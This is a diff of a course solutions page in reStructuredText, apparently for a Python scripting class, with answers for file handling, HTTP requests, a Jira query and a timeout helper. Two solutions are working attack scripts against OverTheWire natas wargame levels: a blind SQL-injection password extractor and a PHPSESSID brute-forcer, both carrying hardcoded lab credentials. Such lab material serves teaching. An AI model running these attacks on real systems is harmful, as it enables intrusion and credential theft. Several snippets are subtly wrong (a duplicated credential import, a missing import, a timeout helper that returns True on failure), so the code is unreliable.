@@ -1,151 +1,193 @@
 Solutions
 ======================================================
 
+.. comment
 
-.. _FIL00_solution:
+    .. _FIL00_solution:
+    Solution to FIL00
+    -----------------------------
 
-Solution to FIL00
------------------------------
+    Working script
+    ____________________________
 
-Working script
-____________________________
+    .. code-block:: python
 
-.. code-block:: python
+        import random
 
-    import random
+        with open('input.txt', 'w') as f:
+            for i in range(10):
+                f.write(str(random.randint(1, 10)) + '\n')
 
-    with open('input.txt', 'w') as f:
-        for i in range(10):
-            f.write(str(random.randint(1, 10)) + '\n')
+        with open('input.txt') as f_in, open('output.txt', 'w') as f_out:
+            for l in f_in:
+                f_out.write(int(l)*"X" + '\n')
 
-    with open('input.txt') as f_in, open('output.txt', 'w') as f_out:
-        for l in f_in:
-            f_out.write(int(l)*"X" + '\n')
+    .. _REQ00_solution:
 
-.. _REQ00_solution:
+    Solution to REQ00
+    -----------------------------
 
-Solution to REQ00
------------------------------
+    Working script
+    ____________________________
 
-Working script
-____________________________
+    .. code-block:: python
 
-.. code-block:: python
+        from requests.auth import HTTPBasicAuth
+        from credentials import username, username
 
-    from requests.auth import HTTPBasicAuth
-    from credentials import username, username
+        URL = "https://userdatabase.lsy.pl/employees/report/employee/active"
 
-    URL = "https://userdatabase.lsy.pl/employees/report/employee/active"
+        auth = HTTPBasicAuth(username, username)
 
-    auth = HTTPBasicAuth(username, username)
+        r = requests.get(URL, auth=auth, verify=False) # to ignore certificate warnings
 
-    r = requests.get(URL, auth=auth, verify=False) # to ignore certificate warnings
+        print(r.status_code)
 
-    print(r.status_code)
+    .. _REQ01_solution:
 
-.. _REQ01_solution:
+    Solution to REQ01
+    -----------------------------
 
-Solution to REQ01
------------------------------
+    Malicious query
+    ____________________________
 
-Malicious query
-____________________________
+    The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be "A"):
 
-The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be "A"):
+    .. code-block:: sql
 
-.. code-block:: sql
+        'natas16" AND password LIKE BINARY "A%'
 
-    'natas16" AND password LIKE BINARY "A%'
+    The full query will have then the form
 
-The full query will have then the form
+    .. code-block:: sql
 
-.. code-block:: sql
-
-    SELECT * from users where username="natas16" AND password LIKE BINARY "A%"
+        SELECT * from users where username="natas16" AND password LIKE BINARY "A%"
 
 
-Working script
-____________________________
+    Working script
+    ____________________________
 
-.. code-block:: python
+    .. code-block:: python
 
-    import requests
-    from requests.auth import HTTPBasicAuth
+        import requests
+        from requests.auth import HTTPBasicAuth
 
-    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
-    URL = "http://natas15.natas.labs.overthewire.org"
+        URL = "http://natas15.natas.labs.overthewire.org"
 
-    auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+        auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
 
-    template = 'natas16" AND password LIKE BINARY "{}%'
+        template = 'natas16" AND password LIKE BINARY "{}%'
 
-    letters = ""
+        letters = ""
 
-    for _ in range(32):
-        for letter in chars:
-            payload = {"username":template.format(letters+letter)}
-            r = requests.get(URL, auth=auth, params=payload)
-            if "This user exists" in r.text:
-                letters += letter
-                print(letters)
+        for _ in range(32):
+            for letter in chars:
+                payload = {"username":template.format(letters+letter)}
+                r = requests.get(URL, auth=auth, params=payload)
+                if "This user exists" in r.text:
+                    letters += letter
+                    print(letters)
+                    break
+
+        print("Password found {}".format(letters))
+
+    .. _REQ02_solution:
+
+    Solution to REQ02
+    -----------------------------
+
+    Working script
+    ____________________________
+
+    .. code-block:: python
+
+        import requests
+        from requests.auth import HTTPBasicAuth
+        import re
+
+        URL = "http://natas18.natas.labs.overthewire.org"
+        auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+
+        for sess_id in range(10000):
+            print("Trying session ID {}".format(sess_id))
+            cookie = {"PHPSESSID":str(sess_id)}
+            payload = {"username":"x", "password":"y"}
+            r = requests.get(URL, auth=auth, cookies=cookie, params=payload)
+            if "You are logged in as a regular user." not in r.text:
+                print("Admin session ID found {}".format(sess_id))
+                password = re.search("Password: ([A-Za-z0-9]{32})", r.text)
+                if password:
+                    print("Password: "+password.group(1))
+                else:
+                    print("Password not found in the response")
+                    print(r.text)
                 break
-
-    print("Password found {}".format(letters))
-
-.. _REQ02_solution:
-
-Solution to REQ02
------------------------------
-
-Working script
-____________________________
-
-.. code-block:: python
-
-    import requests
-    from requests.auth import HTTPBasicAuth
-    import re
-
-    URL = "http://natas18.natas.labs.overthewire.org"
-    auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
-
-    for sess_id in range(10000):
-        print("Trying session ID {}".format(sess_id))
-        cookie = {"PHPSESSID":str(sess_id)}
-        payload = {"username":"x", "password":"y"}
-        r = requests.get(URL, auth=auth, cookies=cookie, params=payload)
-        if "You are logged in as a regular user." not in r.text:
-            print("Admin session ID found {}".format(sess_id))
-            password = re.search("Password: ([A-Za-z0-9]{32})", r.text)
-            if password:
-                print("Password: "+password.group(1))
             else:
-                print("Password not found in the response")
-                print(r.text)
-            break
+                print("FAILED")
         else:
-            print("FAILED")
-    else:
-        print("Brute force on Session ID failed")
+            print("Brute force on Session ID failed")
 
 
 
-.. _API00_solution:
+    .. _API00_solution:
 
-Solution to API00
------------------------------
+    Solution to API00
+    -----------------------------
 
-Working script
-____________________________
+    Working script
+    ____________________________
 
-.. code-block:: python
+    .. code-block:: python
 
-    from jira import JIRA
+        from jira import JIRA
 
-    URL = "https://issues.apache.org/jira/"
-    j = JIRA(URL)
+        URL = "https://issues.apache.org/jira/"
+        j = JIRA(URL)
 
-    search_results = j.search_issues('type="New Feature"', maxResults=100)
-    for issue in search_results:
-        print(issue.fields.summary)
+        search_results = j.search_issues('type="New Feature"', maxResults=100)
+        for issue in search_results:
+            print(issue.fields.summary)
+
+    .. _ADV00_solution:
+
+    Solution to ADV00
+    --------------------
+
+    Working script
+    ________________________
+
+    .. code-block:: python
+
+        def wait_until(condition, timeout=10, raise_exception=True, msg=""):
+            """
+            Wait until the condition returned by 'condition' function is fulfilled,
+            or the timeout is expired. The condition should be checked every 100ms
+
+            Args:
+                condition: a function that checks a condition and returns True or False
+                timeout: maximal timeout after which the function will raise TimeoutException
+                        or return False (if raise_exception is False)
+                msg: message added to the TimeoutException
+            Returns:
+                True when the condition is fulfilled within the timeout,
+                False when the condition is not fulfilled within the timeout
+                        and 'raise_exception' is False
+            Raises:
+                TimeoutException: if raise_exception is True
+                                and the condition is not fulfilled within timeout
+
+            """
+
+            t0 = time.time()
+
+            while time.time() - t0 < timeout:
+                if condition():
+                    return True
+                else:
+                    time.sleep(0.1)
+            if raise_exception:
+                raise TimeoutError("Condition not fulfilled within timeout. Message: " + msg)
+            else:
+                return True
